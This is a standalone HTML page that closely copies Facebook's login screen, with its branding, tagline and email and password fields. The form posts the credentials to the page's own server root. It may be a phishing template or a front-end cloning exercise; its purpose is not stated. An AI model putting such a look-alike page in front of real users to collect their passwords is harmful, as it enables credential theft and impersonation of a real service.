<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Facebook - Log In or Sign Up</title>
<style>
body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
.container { max-width: 980px; margin: 0 auto; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.left { flex: 1; padding-right: 32px; }
.left h1 { color: #1877f2; font-size: 60px; margin: 0 0 10px 0; }
.left p { font-size: 24px; line-height: 28px; width: 500px; }
.right { flex: 1; max-width: 396px; }
.login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); }
.login-box input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
.login-box button { width: 100%; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; padding: 14px; cursor: pointer; }
.login-box button:hover { background: #166fe5; }
.forgot { text-align: center; margin-top: 16px; }
.forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
.create-btn { text-align: center; margin-top: 20px; }
.create-btn button { background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 14px 16px; cursor: pointer; }
@media (max-width: 900px) { .container { flex-direction: column; } .left { text-align: center; padding: 0 0 40px 0; } .left p { width: 100%; } }
</style>
</head>
<body>
<div class="container">
<div class="left">
<h1>facebook</h1>
<p>Connect with friends and the world around you on Facebook.</p>
</div>
<div class="right">
<div class="login-box">
<form action="/" method="POST">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="forgot"><a href="#">Forgot password?</a></div>
<div class="create-btn"><button>Create New Account</button></div>
</div>
</div>
</div>
</body>
</html>
